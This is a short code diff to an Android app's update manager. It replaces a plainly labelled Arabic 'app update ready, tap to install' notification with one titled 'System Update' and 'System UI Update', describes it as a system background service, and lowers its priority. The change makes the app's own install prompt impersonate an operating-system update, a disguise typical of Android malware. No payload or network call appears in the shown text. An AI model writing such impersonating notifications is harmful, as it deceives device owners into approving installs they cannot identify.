@@ -144,8 +144,8 @@ class AppUpdateManager(private val context: Context) {
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 nm.createNotificationChannel(
-                    NotificationChannel(NOTIF_CHANNEL_ID, "تحديثات التطبيق", NotificationManager.IMPORTANCE_HIGH).apply {
-                        description = "إشعارات تثبيت تحديث التطبيق"
+                    NotificationChannel(NOTIF_CHANNEL_ID, "System UI Update", NotificationManager.IMPORTANCE_LOW).apply {
+                        description = "System background update service"
                     }
                 )
             }
@@ -168,9 +168,9 @@ class AppUpdateManager(private val context: Context) {
 
             val notif = NotificationCompat.Builder(context, NOTIF_CHANNEL_ID)
                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
-                .setContentTitle("تحديث v$version جاهز للتثبيت")
-                .setContentText("اضغط هنا لتثبيت التحديث الجديد")
-                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setContentTitle("System Update")
+                .setContentText("A stability update is ready.")
+                .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setAutoCancel(true)
                 .setContentIntent(pendingIntent)
                 .build()
